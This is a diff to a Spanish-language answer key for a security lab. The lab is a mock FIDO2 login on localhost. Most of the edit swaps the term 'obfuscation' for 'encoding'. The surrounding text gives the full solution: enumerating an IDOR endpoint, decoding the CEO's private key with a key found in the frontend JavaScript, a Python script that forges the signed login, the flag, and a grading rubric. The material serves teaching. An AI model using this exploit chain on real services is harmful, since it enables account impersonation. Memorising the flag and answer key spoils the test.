@@ -27,7 +27,7 @@ La app imita superficialmente a WebAuthn con estos endpoints:
 | Endpoint | Qué hace | Vulnerabilidad |
 |---|---|---|
 | `POST /auth/challenge` | `{username}` → `{challenge, user_id}` | Filtra el `user_id` (pista del IDOR). |
-| `GET /auth/keys/<user_id>` | Devuelve la clave privada **ofuscada** del usuario | **IDOR** (sin autorización) + clave privada recuperable del server. |
+| `GET /auth/keys/<user_id>` | Devuelve la clave privada **codificada** del usuario | **IDOR** (sin autorización) + clave privada recuperable del server. |
 | `POST /auth/verify` | `{username, challenge, signature}` → sesión | El único factor es la firma; quien tenga la privada entra. |
 | `GET /profile` | Muestra el `user_id` propio | Pista alternativa del IDOR. |
 
@@ -36,8 +36,8 @@ comentado. Las tres vulnerabilidades:
 
 - **VULN-1 (IDOR):** `/auth/keys/<user_id>` no valida que quien pide sea el
   dueño (ni siquiera exige sesión).
-- **VULN-2 (ofuscación ≠ cifrado):** la clave privada existe del lado del
-  servidor apenas "ofuscada" con `base64(XOR(base64(PEM), key))`, y la `key`
+- **VULN-2 (codificación ≠ cifrado):** la clave privada existe del lado del
+  servidor apenas "codificada" con `base64(XOR(base64(PEM), key))`, y la `key`
   está a la vista en `static/js/script.js`.
 - **VULN-3 (diseño):** un único factor cuya clave privada es alcanzable por la
   red ⇒ suplantable remotamente.
@@ -56,7 +56,7 @@ tocar el botón de huella. En el proxy aparecen, en orden:
 1. `POST /auth/challenge` con `{"username":"alumno"}` → responde
    `{"ok":true,"username":"alumno","user_id":7042,"challenge":"..."}`.
    **Acá ya se filtra el `user_id` propio (7042).**
-2. `GET /auth/keys/7042` → responde la clave privada **ofuscada** del alumno.
+2. `GET /auth/keys/7042` → responde la clave privada **codificada** del alumno.
    **El navegador está bajando una clave privada por la red.**
 3. `POST /auth/verify` con `{"username","challenge","signature"}` → sesión y
    redirección al dashboard.
@@ -71,19 +71,19 @@ verify) y notar la anomalía grave: la clave privada viaja al cliente.
    rango `70xx` se identifica al CEO:
 
    ```
-   GET /auth/keys/7013  →  {"username":"ceo","display_name":"Ricardo Vega — CEO ...", "private_key_obfuscated":"..."}
+   GET /auth/keys/7013  →  {"username":"ceo","display_name":"Ricardo Vega — CEO ...", "private_key":"..."}
    ```
 
-2. **Des-ofuscar:** abrir DevTools → `static/js/script.js`. Ahí está, a la
+2. **Decodificar:** abrir DevTools → `static/js/script.js`. Ahí está, a la
    vista:
-   - La constante `OBFUSCATION_KEY = "hb_backup_key_2026"`.
-   - La función `deobfuscatePrivateKey()`: revierte
-     `base64( XOR( base64(PEM), OBFUSCATION_KEY ) )`.
+   - La constante `BACKUP_KEY = "hb_backup_key_2026"`.
+   - La función `decodePrivateKey()`: revierte
+     `base64( XOR( base64(PEM), BACKUP_KEY ) )`.
 
    Replicando esa lógica se obtiene el PEM de la clave privada del CEO en claro.
 
 **Aprendizaje:** la clave privada jamás debería ser accesible por la red ni
-guardada de forma recuperable en el server. **Ofuscar no es cifrar.** En FIDO2
+guardada de forma recuperable en el server. **Codificar no es cifrar.** En FIDO2
 real no hay ninguna clave privada del lado del server: solo se guardan públicas.
 
 ### Capa 3 — Autenticarse como el CEO (Python)
@@ -113,18 +113,18 @@ from cryptography.hazmat.primitives.asymmetric import ec
 from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature
 
 BASE = "http://localhost:5000"
-OBFUSCATION_KEY = b"hb_backup_key_2026"   # tomada del JS del frontend
+BACKUP_KEY = b"hb_backup_key_2026"   # tomada del JS del frontend
 
 def xor(data, key):
     return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
 
-def deobfuscate(obf):                      # revierte base64(XOR(base64(PEM), key))
-    return base64.b64decode(xor(base64.b64decode(obf), OBFUSCATION_KEY)).decode()
+def decode(obf):                      # revierte base64(XOR(base64(PEM), key))
+    return base64.b64decode(xor(base64.b64decode(obf), BACKUP_KEY)).decode()
 
 s = requests.Session()
 ch = s.post(f"{BASE}/auth/challenge", json={"username": "ceo"}).json()   # (1) challenge + user_id
 keys = s.get(f"{BASE}/auth/keys/{ch['user_id']}").json()                 # (2) IDOR: clave del CEO
-priv = serialization.load_pem_private_key(deobfuscate(keys["private_key_obfuscated"]).encode(), None)
+priv = serialization.load_pem_private_key(decode(keys["private_key"]).encode(), None)
 
 der = priv.sign(ch["challenge"].encode(), ec.ECDSA(hashes.SHA256()))     # (3) firmar
 r, sig_s = decode_dss_signature(der)
@@ -195,7 +195,7 @@ la base de datos del servidor, no puede obtener la clave privada.
 | Lo que rompiste (FIDO2 trucho) | Cómo lo previene FIDO2 real |
 |---|---|
 | Descargaste la clave privada del CEO por la red | La clave nunca sale del TPM — es físicamente inextraíble |
-| La clave estaba ofuscada, no cifrada de verdad | El servidor solo guarda claves PÚBLICAS, no hay secreto que robar |
+| La clave estaba codificada, no cifrada de verdad | El servidor solo guarda claves PÚBLICAS, no hay secreto que robar |
 | Firmaste el challenge como si fueras el CEO | La firma real exige presencia física + verificación biométrica en hardware |
 | El endpoint no validó autorización (IDOR) | La clave no existe fuera del dispositivo, no hay endpoint que exponer |
 | Todo el flujo es suplantable remotamente | FIDO2 ata cada firma al `origin` (dominio) → resistente a phishing |
@@ -208,7 +208,7 @@ El informe del estudiante debería incluir:
 |---|---|---|
 | Reconocimiento (Capa 1) | Capturas de Burp del flujo `challenge → keys → verify` y descripción de la anomalía (la privada viaja al cliente). | 15% |
 | IDOR (Capa 2) | Explicación del `GET /auth/keys/<id>`, evidencia de la enumeración y de cómo identificó al CEO. | 25% |
-| Des-ofuscación (Capa 2) | Descripción del esquema `base64(XOR(base64(PEM),key))`, dónde encontró la key y cómo lo revirtió. | 20% |
+| Decodificación (Capa 2) | Descripción del esquema `base64(XOR(base64(PEM),key))`, dónde encontró la key y cómo lo revirtió. | 20% |
 | Firma y suplantación (Capa 3) | Script/pasos para firmar el challenge (formato raw r||s, curva P-256) y obtener la flag. | 25% |
 | Mitigación | Propuesta concreta: por qué FIDO2 real lo previene (clave en TPM, solo públicas en el server, binding al origin). | 15% |
 
@@ -218,7 +218,7 @@ Flag correcta (`f27ad11c21afef4f4c54a3930698f616`) como condición necesaria.
 
 ### Tiempo estimado de resolución
 - Reconocimiento (Capa 1): 15-25 min.
-- IDOR + des-ofuscación (Capa 2): 25-40 min.
+- IDOR + decodificación (Capa 2): 25-40 min.
 - Firma y suplantación (Capa 3): 25-40 min.
 - **Total estimado: 65-105 minutos** según nivel del participante.
 
